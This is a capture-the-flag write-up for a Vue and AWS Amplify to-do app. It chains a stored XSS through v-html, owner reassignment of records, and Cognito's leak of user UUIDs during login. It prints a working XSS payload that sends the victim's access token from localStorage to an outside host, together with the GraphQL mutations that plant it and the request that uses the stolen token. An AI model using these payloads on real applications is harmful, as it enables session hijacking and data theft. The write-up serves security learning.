# todo

We are presented with a shiny new AWS Amplify application, built with Vue and
Vite. This app is based on the [quickstart
template](https://docs.amplify.aws/vue/start/quickstart/) provided by AWS.

In `amplify/data/resources.ts` we see two models defined, one for TODOs and another for Flags

```javascript
const schema = a.schema({
  Todo: a
    .model({
      content: a.string(),
      owner: a.string(),
    })
    .authorization((allow) => [allow.owner().to(["create", "read", "update", "delete"])]),
  Flag: a
    .model({
      content: a.string(),
    })
    .authorization((allow) => [allow.owner().to(["read"])]),
});
```

This hints at us having to read the Flag models, but they are only readable by
the model's owner, and as a new user, you will not have any flag objects
associated with your account.

We notice is that there is a potential for XSS in `Todos.vue`

```html
<ul>
  <li
    v-for="todo in todos"
    :key="todo.id"
    @click="updateTodo(todo)"
    v-html="todo.content"       <!-- Raw HTML injected into <li> -->
  >
  </li>
</ul>
```

which we can confirm by creating a TODO with content such as

```
<img src="wat" onerror="alert(1)">
```

Reviewing the [documentation for data access](https://docs.amplify.aws/vue/build-a-backend/data/customize-authz/per-user-per-owner-data-access/), we notice this warning.

> By default, owners can reassign the owner of their existing record to another user.

We now realize that we should be able to create an XSS payload that appears on
other user's TODO list, however, we need to identify a user that has access to
the flag.

A comment in the file `amplify/auth/resource.ts` hints at `admin@ggc.tf` being
an admin user, which is our best (and only) lead. (This user also happens to be
the one that created the commit in the git repo).

Observing the graphql queries that are made by the app, we notice that the user
IDs specified are UUIDs and not emails.

```json
{
  "data": {
    "listTodos": {
      "items": [
        {
          "id": "527d5461-d2a4-4fc6-a489-af463dc6a1be",
          "content": "asdf",
          "owner": "70dcd9bc-b0e1-70f7-4bbd-17dc07041ad3",
          "createdAt": "2024-05-22T00:47:20.308Z",
          "updatedAt": "2024-05-23T15:23:31.840Z"
        }
      ],
      "nextToken": null,
      "__typename": "ModelTodoConnection"
    }
  }
}
```

We, therefore, need to find the UUID of `admin@ggc.tf`, in order to make an XSS
payload appear on that user's TODO list. If we manage to execute an XSS payload
in the admin's context, we can obtain his JWT access token out-of-band and
use that to query the flag database.

This application uses AWS Cognito for authentication. Cognito reveals the UUID
of users through the authentication handshake, even if the login attempts
fails. Therefore, we can just attempt to log in with the email `admin@ggc.tf`
and a random password. The challenge response will then reveal the UUID.

```json
{
  "ChallengeName": "PASSWORD_VERIFIER",
  "ChallengeParameters": {
    "SALT": "...",
    "SECRET_BLOCK": "...",
    "SRP_B": "...",
    "USERNAME": "308c397c-d041-7004-1f15-8453c33428eb",
    "USER_ID_FOR_SRP": "308c397c-d041-7004-1f15-8453c33428eb"
  }
}
```

We craft the following XSS payload to exfiltrate the access token OOB.

```
<img
  src="wat"
  onerror="fetch('https://my.domain/?'+\nwindow.localStorage[Object.keys(window.localStorage).filter(x => x.endsWith('accessToken'))[0]])">
```

Now we need to create a TODO,

```json
{
   "query":"mutation ($input: CreateTodoInput!) {\n  createTodo(input: $input) {\n    id\n    content\n    owner\n    createdAt\n    updatedAt\n  }\n}\n",
   "variables":{
      "input":{
         "content":"<img src=\"wat\" onerror=\"fetch('https://my.domain/?'+\nwindow.localStorage[Object.keys(window.localStorage).filter(x => x.endsWith('accessToken'))[0]])\">"
      }
   }
}
```

after that, we can update the TODO and set the owner as the UUID of the admin

```json
{
   "query":"mutation ($input: UpdateTodoInput!) {\n  updateTodo(input: $input) {\n    id\n    content\n    owner\n    createdAt\n    updatedAt\n  }\n}\n",
   "variables":{
      "input":{
         "id":"6ad00e76-24c6-404c-bf49-2b5930299a4d",
         "content":"<img src=\"wat\" onerror=\"fetch('https://my.domain/?'+\nwindow.localStorage[Object.keys(window.localStorage).filter(x => x.endsWith('accessToken'))[0]])\">",
         "owner": "308c397c-d041-7004-1f15-8453c33428eb"
      }
   }
```

Now we just need to wait for the admin to visit the site and the payload to
execute, and we will obtain the access token of the admin user. Using that
token, we can create a graphql query for the flag store to obtain the flag.

```
POST /graphql HTTP/2
Host: sd7blwf5xvfkhnn55s7tetfgja.appsync-api.eu-north-1.amazonaws.com
Content-Length: 302
Content-Type: application/json; charset=UTF-8
Authorization: [EXFILTRATED ACCESS TOKEN]

{"query":"query ($filter: ModelFlagFilterInput, $limit: Int, $nextToken: String) {\n  listFlags(filter: $filter, limit: $limit, nextToken: $nextToken) {\n    items {\n      id\n      content\n      owner\n      createdAt\n      updatedAt\n    }\n    nextToken\n    __typename\n  }\n}\n","variables":{}}
```
